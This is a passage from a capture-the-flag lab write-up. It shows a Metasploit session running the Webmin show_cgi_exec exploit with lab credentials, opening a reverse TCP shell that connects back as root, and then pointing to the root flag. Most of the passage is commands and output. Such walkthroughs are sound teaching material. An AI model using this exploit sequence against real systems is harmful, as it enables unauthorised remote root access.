10.10.10.1LHOST =&gt; 10.10.10.1msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set RHOSTS 127.0.0.1RHOSTS =&gt; 127.0.0.1msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set SSL false[!] Changing the SSL option's value may require changing RPORT!SSL =&gt; falsemsf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set RPORT 10000RPORT =&gt; 10000msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set USERNAME agent47username =&gt; agent47msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set PASSWORD videogamer124PASSWORD =&gt; videogamer124Now everything is set we can run it.msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt; run[*] Started reverse TCP double handler on 10.10.10.1:4444 [*] Attempting to login...[+] Authentication successfully[+] Authentication successfully[*] Attempting to execute the payload...[+] Payload executed successfully[*] Accepted the first client connection...[*] Accepted the second client connection...[*] Command: echo 7Fb8i0Az0Jq2XHQd;[*] Writing to socket A[*] Writing to socket B[*] Reading from sockets...[*] Reading from socket A[*] A: \"7Fb8i0Az0Jq2XHQd\\r\\n\"[*] Matching...[*] B is input...[*] Command shell session 1 opened (10.10.10.1:4444 -&gt; 10.10.105.217:50912) at 2022-08-17 17:43:52 +0100iduid=0(root) gid=0(root) groups=0(root)whoamiroot What is the root flag? Execute cat /root/root.txt and you will get itConclusionA cool challenge introducing SSH tunnels with a mix of web and privesc." } ]
